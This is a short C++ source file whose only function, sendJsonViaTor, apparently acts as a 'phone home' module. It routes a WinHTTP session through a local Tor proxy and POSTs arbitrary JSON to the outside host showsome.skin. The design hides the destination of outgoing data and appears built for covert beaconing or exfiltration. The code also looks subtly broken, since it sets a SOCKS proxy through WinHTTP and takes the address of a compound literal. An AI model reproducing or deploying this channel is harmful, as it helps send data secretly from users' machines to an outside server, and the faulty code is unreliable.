#include "mail_home.h"
#include <windows.h>
#include <winhttp.h>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

bool sendJsonViaTor(const std::string& json) {
    HINTERNET hSession = WinHttpOpen(L"NetSwimmer/1.0",
                                     WINHTTP_ACCESS_TYPE_NO_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) {
        std::cerr << "[mail_home] ❌ Failed to open WinHTTP session\n";
        return false;
    }

    // Set SOCKS5 proxy to Tor's default
    WinHttpSetOption(hSession, WINHTTP_OPTION_PROXY, 
        (LPVOID)&(WINHTTP_PROXY_INFO){
            WINHTTP_ACCESS_TYPE_NAMED_PROXY,
            (LPWSTR)L"socks=127.0.0.1:9050",
            NULL
        },
        sizeof(WINHTTP_PROXY_INFO)
    );

    HINTERNET hConnect = WinHttpConnect(hSession, L"showsome.skin", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        std::cerr << "[mail_home] ❌ Failed to connect\n";
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        std::cerr << "[mail_home] ❌ Failed to open request\n";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    BOOL bResults = WinHttpSendRequest(hRequest,
                                       L"Content-Type: application/json\r\n",
                                       -1L,
                                       (LPVOID)json.c_str(),
                                       json.length(),
                                       json.length(),
                                       0);

    if (!bResults) {
        std::cerr << "[mail_home] ❌ Failed to send request\n";
    } else {
        WinHttpReceiveResponse(hRequest, NULL);
        std::cout << "[mail_home] ✅ Sent JSON via Tor proxy\n";
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResults;
}